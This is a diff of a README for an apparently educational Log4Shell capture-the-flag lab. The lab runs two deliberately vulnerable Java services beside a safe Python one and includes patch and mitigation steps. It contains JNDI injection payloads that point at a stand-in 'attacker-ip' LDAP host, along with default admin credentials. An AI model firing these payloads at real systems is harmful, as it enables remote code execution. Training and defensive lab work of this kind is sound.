@@ -18,27 +18,28 @@ This scenario teaches:
 
 ## 🏗️ Architecture
 
-| Service | Port | Language | Log4j | Vulnerable |
-|---------|------|----------|-------|------------|
-| Auth Service | 8001 | Java / Spring Boot | 2.14.1 | ✅ YES |
-| Inventory Service | 8002 | Java / Spring Boot | 2.14.1 | ✅ YES |
-| Status Service | 8003 | Python / Flask | None | ❌ NO |
+| Service | Host port (DEMO-FULL) | Container port | Language | Log4j | Vulnerable |
+|---------|------------------------|----------------|----------|-------|------------|
+| Auth Service | 8101 | 8001 | Java / Spring Boot | 2.14.1 | ✅ YES |
+| Inventory Service | 8102 | 8002 | Java / Spring Boot | 2.14.1 | ✅ YES |
+| Status Service | 8103 | 8003 | Python / Flask | None | ❌ NO |
 
 ### Why three services?
 The scenario mirrors real-world environments where not every service shares the same dependencies. The Status Service (Python) is intentionally safe — demonstrating that **you cannot assume all services are vulnerable**. SBOMs are needed to determine exactly which services use Log4j.
 
 ---
 
-## 🚀 Administrator Controls
+## 🚀 Administrator Controls (monorepo)
+
+Run from the **repository root** (`DEMO-FULL/`):
 
 | Command | Description |
 |---------|-------------|
-| `make setup` | Build all Docker images |
-| `make up` | Start all three services |
-| `make down` | Stop all services |
-| `make reset` | **GAME STATE RESET** — wipe and rebuild from scratch |
-| `make logs` | View service logs |
-| `make test` | Run health checks on all services |
+| `make up` | Start full stack (includes these three services) |
+| `make down` | Stop entire stack |
+| `make reset-log4j` | Recreate **only** the Log4j lab containers |
+| `make logs` | All container logs |
+| `make test-log4j` | Health checks against host ports 8101–8103 |
 
 ---
 
@@ -46,18 +47,18 @@ The scenario mirrors real-world environments where not every service shares the 
 
 | Flag | Location | How to Reach |
 |------|----------|-------------|
-| **Auth Flag** | `/flags/auth_flag.txt` in auth container | RCE via Log4Shell on `/login` username field |
-| **Inventory Flag** | `/flags/inventory_flag.txt` in inventory container | RCE via Log4Shell on `/search?q=` parameter |
+| **Auth Flag** | `/flags/auth_flag.txt` in auth container | RCE via Log4Shell on `POST /login` (host **8101**) |
+| **Inventory Flag** | `/flags/inventory_flag.txt` in inventory container | RCE via Log4Shell on `GET /search?q=` (host **8102**) |
 
 ---
 
 ## 🛠️ Service Configuration
 
-| Setting | Value |
-|---------|-------|
-| Auth Service | `http://localhost:8001` |
-| Inventory Service | `http://localhost:8002` |
-| Status Service | `http://localhost:8003` |
+| Setting | Value (DEMO-FULL host ports) |
+|---------|-------------------------------|
+| Auth Service | `http://localhost:8101` |
+| Inventory Service | `http://localhost:8102` |
+| Status Service | `http://localhost:8103` |
 
 **Default Credentials (Auth Service):**
 - Admin: `admin` / `admin`
@@ -66,7 +67,7 @@ The scenario mirrors real-world environments where not every service shares the 
 
 ## ⚠️ Known Vulnerabilities
 
-### 1. Log4Shell — CVE-2021-44228 (Auth Service — port 8001)
+### 1. Log4Shell — CVE-2021-44228 (Auth Service — host port 8101)
 **Where:** `POST /login` — `username` field is logged directly by Log4j without sanitization.
 
 **Payload:**
@@ -82,7 +83,7 @@ The scenario mirrors real-world environments where not every service shares the 
 
 ---
 
-### 2. Log4Shell — CVE-2021-44228 (Inventory Service — port 8002)
+### 2. Log4Shell — CVE-2021-44228 (Inventory Service — host port 8102)
 **Where:** `GET /search?q=` — search query is logged directly by Log4j.
 
 **Payload:**
@@ -93,24 +94,13 @@ GET /search?q=${jndi:ldap://attacker-ip:1389/exploit}
 ---
 
 ### 3. Status Service — NOT Vulnerable
-`GET /search?q=` on port 8003 accepts the same input but uses Python's standard logging library — no JNDI processing occurs.
+`GET /search?q=` on host port 8103 accepts the same input but uses Python's standard logging library — no JNDI processing occurs.
 
 ---
 
-## 🏹 Attacker Toolkit
+## 🏹 Attacker approach
 
-The `tools/attack/` directory contains the exploit script:
-
-```bash
-# Terminal 1 — start JNDI canary listener
-python3 tools/attack/log4shell_exploit.py --listen
-
-# Terminal 2 — probe all services
-python3 tools/attack/log4shell_exploit.py --probe
-
-# Run full chain
-python3 tools/attack/log4shell_exploit.py --all
-```
+Use your own JNDI/LDAP tooling (for example [JNDI-Exploit-Kit](https://github.com/welk1n/JNDI-Injection-Exploit) or class‑teaching listeners) against the endpoints above. Point payloads at `localhost:8101` (auth `/login` body) and `localhost:8102` (`/search?q=`).
 
 ---
 
@@ -151,9 +141,10 @@ Update `pom.xml` in each vulnerable service — change Log4j version from `2.14.
 <version>2.17.1</version>
 ```
 
-Then rebuild:
+Then rebuild the lab containers:
 ```bash
-make reset
+# from repo root
+make reset-log4j
 ```
 
 ### Mitigation without patching (Log4j 2.10+)
@@ -177,12 +168,10 @@ ENTRYPOINT ["java", "-Dlog4j2.formatMsgNoLookups=true", "-jar", "app.jar"]
 | `services/auth-service/` | Java Spring Boot auth app — Log4j 2.14.1 (vulnerable) |
 | `services/inventory-service/` | Java Spring Boot inventory app — Log4j 2.14.1 (vulnerable) |
 | `services/status-service/` | Python Flask status app — no Log4j (safe) |
-| `docker-compose.yml` | Defines all three services |
+| Root `docker-compose.yaml` | Defines all services for the monorepo |
 | `flags/` | CTF flag files mounted into containers |
-| `tools/attack/log4shell_exploit.py` | Red Team exploit script |
-| `tools/test/test_services.sh` | Health check script |
-| `Makefile` | Admin controls |
-| `restore.sh` | Full reset logic |
+| `tools/test/test_services.sh` | Health check script (`make test-log4j`) |
+| `restore.sh` | Recreate only Log4j services via root compose |
 
 ---
 
